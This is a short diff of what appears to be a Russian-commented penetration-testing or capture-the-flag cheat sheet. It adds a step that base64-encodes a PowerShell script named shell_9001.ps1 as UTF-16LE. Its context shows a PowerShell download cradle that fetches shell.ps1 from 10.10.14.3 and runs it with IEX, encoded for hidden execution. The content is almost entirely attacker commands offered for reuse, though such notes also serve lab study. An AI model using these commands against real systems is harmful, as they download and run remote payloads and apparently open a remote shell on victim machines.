@@ -51,6 +51,10 @@ exit
 
 cat sharp.zip.b64 | base64 -d > sharp_r.zip
 
+# Коируем в линукс для Windows base64 
+
+cat shell_9001.ps1| iconv -t utf-16le | base64 -w 0
+
 # Кодируем скрипт в базе64 utf16 и запускаем
 
 echo -n "IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.3/shell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
